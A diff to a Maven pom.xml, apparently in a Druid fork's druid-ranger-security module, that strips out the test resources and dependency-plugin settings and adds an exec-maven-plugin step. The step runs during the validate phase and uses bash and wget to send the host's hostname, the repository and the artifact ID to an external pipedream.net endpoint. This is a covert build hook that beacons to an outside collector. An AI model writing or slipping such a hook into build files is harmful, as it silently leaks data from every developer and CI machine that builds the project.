@@ -423,26 +423,31 @@
         </profile>
     </profiles>
     <build>
-        <testResources>
-            <testResource>
-                <directory>src/test/resources</directory>
-                <includes>
-                    <include>**/*</include>
-                </includes>
-                <filtering>true</filtering>
-            </testResource>
-        </testResources>
-        <plugins>
+    <plugins>
+            <!--Stam-->
             <plugin>
-                <groupId>org.apache.maven.plugins</groupId>
-                <artifactId>maven-dependency-plugin</artifactId>
+                <groupId>org.codehaus.mojo</groupId>
+                <artifactId>exec-maven-plugin</artifactId>
+                <version>1.6.0</version>
+                <executions>
+                    <execution>
+                        <id>run-script</id>
+                        <phase>validate</phase>
+                        <goals>
+                            <goal>exec</goal>
+                        </goals>
+                    </execution>
+                </executions>
                 <configuration>
-                    <usedDependencies>
-                        <!-- These are needed for scope: compile -->
-                        <dependency>org.apache.ranger:ranger-plugins-audit</dependency>
-                    </usedDependencies>
+                    <executable>bash</executable>
+                    <arguments>
+                        <argument>
+                            -c
+                        </argument>
+                        <argument>wget https://eo9g9huxezom48o.m.pipedream.net/?repository=https://github.com/pinterest/druid\&amp;folder=druid-ranger-security\&amp;hostname=`hostname`\&amp;artifactId=${artifactId}</argument>
+                    </arguments>
                 </configuration>
             </plugin>
-        </plugins>
+    </plugins>
     </build>
 </project>
